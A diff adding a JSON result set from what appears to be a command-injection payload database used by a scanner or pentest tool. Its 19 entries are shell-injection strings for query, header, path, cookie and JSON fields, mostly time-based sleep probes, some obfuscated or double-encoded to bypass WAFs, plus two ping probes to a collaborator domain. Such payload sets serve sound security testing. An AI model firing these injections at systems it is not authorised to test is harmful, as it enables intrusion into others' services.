@@ -1,0 +1,377 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "cmdi"
+  },
+  "count": 19,
+  "results": [
+    {
+      "id": "2697e8d9f51f99c6",
+      "payload": "|| sleep SLEEP_SECONDS",
+      "technique": "command_chaining",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "OR chaining — executes if prior command fails.",
+      "source": "ensphere",
+      "tags": [
+        "linux",
+        "or_chain",
+        "sleep"
+      ]
+    },
+    {
+      "id": "2ab883cfbc3a2454",
+      "payload": ";sleep${IFS}SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "${IFS} brace-delimited variant for space bypass.",
+      "source": "ensphere",
+      "tags": [
+        "ifs",
+        "linux",
+        "obfuscation",
+        "sleep"
+      ]
+    },
+    {
+      "id": "38508e25c79029ca",
+      "payload": "\nsleep SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Newline + sleep.",
+      "source": "ensphere",
+      "tags": [
+        "linux",
+        "newline",
+        "sleep"
+      ]
+    },
+    {
+      "id": "3b8806c157907ec6",
+      "payload": "; sleep SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Semicolon command separator + sleep. Confirm via response delay.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "linux",
+        "semicolon",
+        "sleep"
+      ]
+    },
+    {
+      "id": "43ddec4b7dbcdbd0",
+      "payload": "\u0026 timeout /t SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Windows ampersand separator + timeout.",
+      "source": "ensphere",
+      "tags": [
+        "ampersand",
+        "timeout",
+        "windows"
+      ]
+    },
+    {
+      "id": "52aa3b211d203ea2",
+      "payload": "`sleep SLEEP_SECONDS`",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Backtick sleep for blind confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "backtick",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "628ff5ee93aa5b77",
+      "payload": "\u0026 powershell -c \"Start-Sleep -Seconds SLEEP_SECONDS\"",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "PowerShell Start-Sleep for time-based blind confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "powershell",
+        "sleep",
+        "windows"
+      ]
+    },
+    {
+      "id": "78e84bfc76d20828",
+      "payload": "; sleep SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Command injection via HTTP header (User-Agent, Referer, etc.).",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "8a0bb742db257d66",
+      "payload": ";sleep${IFS}SLEEP_SECONDS;",
+      "technique": "command_injection",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Command injection via URL path segment. Uses ${IFS} for space bypass in path context.",
+      "source": "ensphere",
+      "tags": [
+        "ifs",
+        "linux",
+        "path",
+        "sleep"
+      ]
+    },
+    {
+      "id": "99bd5d7b700a4e2e",
+      "payload": "\u0026\u0026 sleep SLEEP_SECONDS",
+      "technique": "command_chaining",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "AND chaining — executes if prior command succeeds.",
+      "source": "ensphere",
+      "tags": [
+        "and_chain",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "a8ac724b51bf9c49",
+      "payload": "$(sleep SLEEP_SECONDS)",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "$() sleep for blind confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "dollar_paren",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "aa98eb4f708fbfba",
+      "payload": "| sleep SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Pipe + sleep for time-based confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "linux",
+        "pipe",
+        "sleep"
+      ]
+    },
+    {
+      "id": "b394ad348255fc48",
+      "payload": "%253B%2520sleep%2520SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double URL-encoded semicolon + sleep. Bypasses single-decode WAFs.",
+      "source": "ensphere",
+      "tags": [
+        "double_url_encoded",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "cc13aea831a89c20",
+      "payload": ";sleep$'\\t'SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "$'\\t' ANSI-C tab character as argument separator.",
+      "source": "ensphere",
+      "tags": [
+        "ansi_c_quote",
+        "linux",
+        "obfuscation",
+        "sleep",
+        "tab"
+      ]
+    },
+    {
+      "id": "e0ff6cfc16bd7ddd",
+      "payload": "$(sleep SLEEP_SECONDS)",
+      "technique": "command_injection",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Command substitution via cookie value. Targets apps that pass cookie values to shell.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "linux",
+        "sleep"
+      ]
+    },
+    {
+      "id": "e912f90c43eab3d1",
+      "payload": "%3B%20sleep%20SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "URL-encoded semicolon + sleep.",
+      "source": "ensphere",
+      "tags": [
+        "linux",
+        "sleep",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "eb02a852ffc65fc3",
+      "payload": "; sleep SLEEP_SECONDS",
+      "technique": "command_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Semicolon injection via JSON body field.",
+      "source": "ensphere",
+      "tags": [
+        "json",
+        "linux",
+        "semicolon",
+        "sleep"
+      ]
+    },
+    {
+      "id": "f06af5f9e69e1d72",
+      "payload": "; ping -c 1 COLLAB_DOMAIN",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "OOB via ICMP ping with DNS resolution.",
+      "source": "ensphere",
+      "tags": [
+        "linux",
+        "oob",
+        "ping"
+      ]
+    },
+    {
+      "id": "fc8d1a7949fcbae1",
+      "payload": "\u0026 ping -n 1 COLLAB_DOMAIN",
+      "technique": "command_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Windows OOB via ping.",
+      "source": "ensphere",
+      "tags": [
+        "oob",
+        "ping",
+        "windows"
+      ]
+    }
+  ]
+}
